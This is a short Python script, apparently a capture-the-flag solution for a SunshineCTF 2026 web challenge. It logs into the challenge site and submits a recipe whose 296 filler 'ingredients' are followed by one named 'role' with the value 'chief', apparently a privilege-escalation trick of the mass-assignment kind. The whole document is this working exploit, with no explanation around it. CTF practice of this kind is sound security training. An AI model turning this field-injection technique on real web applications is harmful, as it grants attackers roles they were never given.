import requests
import json

url = "https://tomorrow.web.2026.sunshinectf.games"

s = requests.session()
auth = "gokilGamingBuddyBro11SKi"
s.post(f"{url}/login", data={"username": auth, "password": auth})

ingredients = []
for i in range(1, 297):
    ingredients.append({
        "name": f"ing{i}",
        "value": f"{i}"
    })

ingredients.append({
    "name": "role",
    "value": "chief"
})

data = {
    "title": "ini title",
    "ingredients": ingredients
}
print(data)

r = s.post(f"{url}/api/recipe", json=data)
print(r.text)
